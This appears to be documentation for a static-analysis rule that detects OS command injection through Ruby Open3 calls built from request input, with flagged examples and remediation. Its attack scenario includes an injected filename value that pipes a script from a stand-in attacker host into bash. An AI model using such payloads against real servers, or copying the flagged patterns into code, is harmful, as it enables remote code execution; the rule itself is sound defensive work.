---
title: "VNX-RUBY-008 – Open3 shell command built from request input"
description: "Reports Open3 pipeline, popen and capture calls in their single-string (shell) form when the command string interpolates, concatenates or formats request input, or is request input itself, including the sh -c argument form. Other argument-list forms, constants and Shellwords-escaped input are not reported."
---

## Overview

This rule flags calls to the `Open3` pipeline family (`pipeline`, `pipeline_r`, `pipeline_rw`, `pipeline_w`, `pipeline_start`) and to `popen3`, `popen2`, `popen2e`, `capture2`, `capture2e` and `capture3` when a shell command string is built from request input. Given a single string, these methods hand it to the shell. When the command or any component of the pipeline is constructed using user-supplied input — whether from request parameters, environment variables, or database values — an attacker who controls that input can terminate the intended command and inject additional shell instructions.

The Open3 pipeline family is particularly risky compared to simpler subprocess APIs because each element in the pipeline is passed to the shell for interpretation. A single vulnerable call can spawn multiple malicious processes, redirect output to attacker-controlled locations, and leave behind backdoors while the application continues to function normally, making the compromise difficult to detect.

This rule corresponds to [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html).

**Severity:** High | **CWE:** [CWE-78 – Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

Command injection via Open3 pipeline methods is particularly dangerous because the attacker gains the ability to execute arbitrary shell commands with the privileges of the web server process. Unlike simpler injection vulnerabilities, command injection provides immediate code execution rather than requiring further exploitation steps.

A typical attack scenario involves a file-processing endpoint that pipes a user-supplied filename through several utilities. The attacker submits a filename like `report.pdf; curl http://attacker.com/shell.sh | bash` or uses backtick substitution. The server obediently executes the injected payload alongside the intended pipeline. If the process runs as a service account with broad filesystem or network access, the attacker can exfiltrate secrets, install persistence mechanisms, or pivot to internal services that are not accessible from the internet.

Even when application input is partially validated, shell metacharacter injection is a persistent risk. Developers often sanitize for SQL or HTML but forget that the shell interprets characters such as `;`, `|`, `` ` ``, `$(`, `>`, and `<` as special instructions. A robust fix requires removing the shell entirely from the subprocess call by passing commands as explicit argument arrays.

## What Gets Flagged

The rule reports an Open3 call in its single-string (shell) form whose command string interpolates, concatenates or formats request input (`params`, `request.*`, cookies, Rack env keys, an upload's `original_filename`), directly or through a variable assigned from it a few lines above. Argument-list and array forms, constant commands and input passed through `Shellwords.escape` are not reported.

```ruby
# FLAGGED: interpolated request input in a pipeline
Open3.pipeline_r("cat #{params[:file]}", "wc -l") do |last, _threads|

# FLAGGED: two-line flow into capture3, concatenation
host = params[:host]
stdout, stderr, st = Open3.capture3("nslookup " + host)

# FLAGGED: the command is the parameter itself, or formatted from it
Open3.popen2e(params[:cmd]) { |i, o, t| o.read }
Open3.popen2(format("unzip %s", params[:zip])) { |i, o, t| o.read }

# NOT FLAGGED: argument list, no shell
Open3.capture2("convert", params[:f])
```

## Remediation

1. **Pass commands as argument arrays instead of shell strings.** When each element of the pipeline is an array, Ruby's Open3 bypasses the shell entirely and passes arguments directly to `execve`. Shell metacharacters in user input become harmless literal strings:

```ruby
# SAFE: argument array form — no shell interpretation
filename = params[:file]
Open3.pipeline_r(["cat", filename], ["wc", "-l"]) do |first, last, _|
  puts last.read
end
```

2. **Validate and allowlist all user-supplied values before use.** Restrict filenames and other parameters to a known-safe character set before passing them anywhere near a subprocess call:

```ruby
# SAFE: validate input against an allowlist pattern
filename = params[:file]
raise ArgumentError, "invalid filename" unless filename.match?(/\A[\w\-]+\.(pdf|txt|csv)\z/)

Open3.pipeline_r(["cat", filename], ["wc", "-l"]) do |_first, last, _threads|
  puts last.read
end
```

3. **Consider higher-level libraries.** If the goal is data processing rather than shelling out, Ruby libraries such as `mini_magick`, `pdf-reader`, or `CSV` perform the same work without spawning shell processes at all.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Ruby Open3 documentation](https://ruby-doc.org/stdlib/libdoc/open3/rdoc/Open3.html)
- [OWASP Ruby on Rails Security Guide](https://guides.rubyonrails.org/security.html)
